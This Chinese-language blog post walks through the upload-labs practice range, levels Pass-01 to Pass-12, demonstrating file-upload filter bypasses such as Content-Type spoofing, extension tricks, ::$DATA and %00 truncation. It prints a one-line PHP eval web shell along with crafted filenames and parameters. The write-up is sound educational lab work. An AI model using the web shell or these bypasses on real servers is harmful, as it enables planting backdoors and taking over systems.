---
title:  "upload-labs靶场实战"
excerpt: "upload-labs靶场实战"
author: "lcc"
layout: single
tags:
  - 早期文档
categories:
  - web安全
---
# upload-labs靶场实战

## 环境搭建

在github下载：

[GitHub - c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场](https://github.com/c0ny1/upload-labs)

然后使用phpstudy（小皮）搭建，搭建时注意下表（github上copy下来的）：

| 配置项   | 配置                       | 描述                                                         |
| -------- | -------------------------- | ------------------------------------------------------------ |
| 操作系统 | Window or Linux            | 推荐使用Windows，除了Pass-19必须在linux下，其余Pass都可以在Windows上运行 |
| PHP版本  | 推荐5.2.17                 | 其他版本可能会导致部分Pass无法突破                           |
| PHP组件  | php_gd2,php_exif           | 部分Pass依赖这两个组件                                       |
| 中间件   | 设置Apache以moudel方式连接 |                                                              |

启动服务后，点击网站-创建网站，如果只想要在局域网中通过ip访问，可以将域名设置为ip

## 连接工具

中国菜刀或中国蚁剑：

```
<?php @eval($_POST['cmd']);?>
```



## 实战

### Pass-01（JS绕过）

- 直接上传php文件，反馈：![image-20220704113341535](/assets/images/web_sec/image-20220704113341535.png)


- 查看页面源码可知为前端jsp检查文件类型，应采用插件删除jsp源码或使用burp suite绕过，这里使用burpsuite绕过![image-20220704113630222](/assets/images/web_sec/image-20220704113630222.png)

- 使用中国菜刀访问可成功访问

  访问网址为http://10.2.2.1/upload/1.php，口令为菜刀

   ![image-20220704124616448](/assets/images/web_sec/image-20220704124616448.png)





### Pass-02（Content-Type绕过）

- 先上传php看反馈：![image-20220704130716522](/assets/images/web_sec/image-20220704130716522.png)
- 再查看jsp可以知道这次为后端检测文件类型
- 通过burp suite抓包可以发现，上传php文件，Content-Type为application/octet-stream，而上传jpg文件Content-Type为image/jpeg，上传jpg可以成功，因此上传php文件时尝试将Content-Type设置为image/jpeg：![image-20220704131223681](/assets/images/web_sec/image-20220704131223681.png)
- 然后用中国菜刀访问成功。

### Pass-03（文件后缀绕过）

- 先上传php看反馈：![image-20220704131504342](/assets/images/web_sec/image-20220704131504342.png)

- 这里只过滤四种文件类型，因此可以尝试修改后缀名为php3、phtml

  ![image-20220704135339073](/assets/images/web_sec/image-20220704135339073.png)

- 这里将文件改为1.php3上传后使用中国菜刀可以成功访问

  设置的地址和口令：![image-20220704135450686](C:\Users\lcc\AppData\Roaming\Typora\typora-user-images\image-20220704135450686.png)

  进入的界面：![image-20220704135427254](/assets/images/web_sec/image-20220704135427254.png)

- 经过尝试，后缀名为php3和phtml都可以。

### Pass-04（文件后缀绕过-apache漏洞）

- 先上传php看反馈：

  ![image-20220704140000232](/assets/images/web_sec/image-20220704140000232.png)

- 前面的几种方式都不行了，考虑到apache识别文件拓展名时是从右边往左边识别，遇到不认识的拓展名就不管，而遇到认识的就会将其作为拓展名，因此**将1.php文件名修改为1.php.xxxxx**并上传，上传成功

- 访问链接，显然成功：

  ![image-20220704140232571](/assets/images/web_sec/image-20220704140232571.png)

- 接下来就使用中国菜刀访问，可以正常访问

   

### Pass-05（文件后缀大小写绕过）

- 查看源码，发现这一关没有将大写转小写，而且也没过滤".PHP"等拓展名，因此直接将拓展名改为.PHP即可

  ![image-20220704143633798](/assets/images/web_sec/image-20220704143633798.png)

- 上中国菜刀：

  ![image-20220704143713994](/assets/images/web_sec/image-20220704143713994.png)

  ![image-20220704143733879](/assets/images/web_sec/image-20220704143733879.png)

- 成功

### Pass-06（末尾空格绕过）

- 查看源码没有对末尾的空格做过滤，而单纯的在文件名最末尾加上空格是加不上去的，故而使用burp suite进行添加

  ![image-20220704145749912](/assets/images/web_sec/image-20220704145749912.png)

- forward后文件上传成功，右键图片获取链接就可以使用中国菜刀访问了：

  ![image-20220704145901834](/assets/images/web_sec/image-20220704145901834.png)![image-20220704145951143](/assets/images/web_sec/image-20220704145951143.png)

- 成功





### Pass-07（末尾'.'绕过）

- 对于**windows**来说，文件名除了末尾为空格会去掉以外，末尾为点都可以去掉，因此与Pass-06类似![image-20220704154405033](/assets/images/web_sec/image-20220704154405033.png)然后forward后得到链接即可使用中国菜刀访问：![image-20220704154557017](/assets/images/web_sec/image-20220704154557017.png)![image-20220704154653563](/assets/images/web_sec/image-20220704154653563.png)

### Pass-08（::$DATA绕过）

- 在**windows**中如果文件名加上"::\$DATA"就会把“::\$DATA”后面的数据当做文件流处理而不做任何检测，也就是相当于前面的绕过

- 使用burp suite拦截然后在文件名末尾添加“::\$DATA”并foward即可![image-20220704155121745](/assets/images/web_sec/image-20220704155121745.png)

- 上传成功，得到链接后使用中国菜刀连接。

  ![image-20220704155549007](/assets/images/web_sec/image-20220704155549007.png)

### Pass-09（“.”、空格、“::\$DATA”混合绕过）

- 通过查看源码可以看到末尾的“.”、空格、“::\$DATA”都被过滤了,但它是最先过滤点，然后过滤“::\$DATA”,最后过滤空格，因此可以构造以下文件名

  ```
  1.php. .
  1.php.::$DATA
  1.php . .
  1.php.::$DATA
  1.php::$DATA
  ```

- 然后使用burp suite进行前三题一样的操作即可

  ![image-20220704162958451](/assets/images/web_sec/image-20220704162958451.png)

  得到链接：http://10.2.2.1/upload/1.php%20.

   ![image-20220704163550553](/assets/images/web_sec/image-20220704163550553.png)





### Pass-10（双写绕过）

- 查看源码并没有对“.”做过滤，因此可以使用“.”绕过，但前面用过这种方式了，所以这次来个不一样的，用重叠的php进行绕过

  ```
  1.pphphp
  ```

- 上传成功得到链接：http://10.2.2.1/upload/%7F1.php

- 之后就可以用中国菜刀了

### Pass-11（Get“%00”绕过）

- 从源码中可以看到，它会找到文件名中'jpg','png','gif'三个字符串中最后一次出现的位置，并从这个位置截取扩展名，这是一种白名单，白名单这大概是没办法了，于是看下边的代码。

  ```php
  if(in_array($file_ext,$ext_arr)){
          $temp_file = $_FILES['upload_file']['tmp_name'];
          $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
  
  		if(move_uploaded_file($temp_file,$img_path)){
              $is_upload = true;
          } else {
              $msg = '上传出错！';
          }
  } 
  ```

  注意到img_path是拼接得到的，再加上PHP版本小于5.3.4且magic_quotes_gpc为off状态，因此可以采用“%00”截断绕过，“%00”会将在其后面的所有字符串抹去，再加上save_path可控，使用burp suite构造以下参数：

  ```
  filename='1.jpg'
  ```

  ```
  save_path = ../upload/1.php%00
  ```

   ![image-20220704202300856](/assets/images/web_sec/image-20220704202300856.png)

- 上传成功，以下是生成的图片链接：http://10.2.2.1/upload/1.php%EF%BF%BD/1420220704202529.jpg，这个链接是找不到文件的，改成http://10.2.2.1/upload/1.php才可以访问

- 看upload可以发现已经上传成功了：

  ![image-20220704202756648](/assets/images/web_sec/image-20220704202756648.png)

### Pass-12（Post“%00”绕过）

- 相比上一关，这一关的save_path不再可控，因为这关用post传输save_path

- 这一关属实是没想到，只知道用%00去做截断，事实的确如此，不过需要在Request的Hex格式包中在将php后面的一个字节的内容改为“00”![image-20220704205509413](/assets/images/web_sec/image-20220704205509413.png)

- get可以用%00的原因是可以对其解码，而post不行

  ![image-20220704210543380](/assets/images/web_sec/image-20220704210543380.png)
